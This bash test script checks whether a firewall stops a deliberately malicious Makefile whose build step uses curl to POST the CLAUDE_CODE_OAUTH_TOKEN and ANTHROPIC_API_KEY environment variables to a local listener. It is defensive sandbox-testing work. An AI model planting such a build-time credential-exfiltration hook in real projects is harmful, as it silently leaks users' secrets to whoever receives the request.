#!/bin/bash
# Simulate a malicious Makefile/build script that attempts to exfiltrate
# env vars via an outbound HTTP request. Verifies that:
# 1. The exfiltration target receives the request (baseline, no firewall)
# 2. With firewall rules, the exfiltration is blocked

EXFIL_PORT=18924
EXFIL_LOG="/tmp/exfil_capture.log"

# Create a malicious Makefile that tries to exfiltrate env vars
TMPDIR_BUILD=$(mktemp -d)
cat > "$TMPDIR_BUILD/Makefile" << 'MAKEFILE'
.PHONY: build
build:
	@curl -sf --max-time 2 -X POST \
		-d "TOKEN=$${CLAUDE_CODE_OAUTH_TOKEN:-none} ANTHROPIC=$${ANTHROPIC_API_KEY:-none}" \
		http://127.0.0.1:18924/exfil 2>/dev/null || true
	@echo "Build complete"
MAKEFILE

# --- Test 1: without firewall, build can reach listener ---
start_listener $EXFIL_PORT "$EXFIL_LOG"

make -C "$TMPDIR_BUILD" build >/dev/null 2>&1
sleep 0.5

stop_listener $LISTENER_PID

if [[ -f "$EXFIL_LOG" ]]; then
  CAPTURED=$(cat "$EXFIL_LOG")
  if echo "$CAPTURED" | grep -qvE "^TOKEN=none ANTHROPIC=none$"; then
    fail "build exfiltrated env vars to localhost: $CAPTURED"
  else
    pass "build reached localhost but env vars are empty/not set (no secrets to leak)"
  fi
else
  pass "build exfiltration request did not reach listener"
fi

# --- Test 2: with firewall, build exfiltration is blocked ---
start_listener $EXFIL_PORT "$EXFIL_LOG"

sudo iptables -A OUTPUT -p tcp --dport $EXFIL_PORT -j DROP
make -C "$TMPDIR_BUILD" build >/dev/null 2>&1
sleep 0.5

sudo iptables -D OUTPUT -p tcp --dport $EXFIL_PORT -j DROP 2>/dev/null
stop_listener $LISTENER_PID

if [[ ! -f "$EXFIL_LOG" ]]; then
  pass "build exfiltration blocked by firewall rule"
else
  fail "build exfiltration succeeded despite firewall rule"
fi

rm -rf "$TMPDIR_BUILD" "$EXFIL_LOG" 2>/dev/null
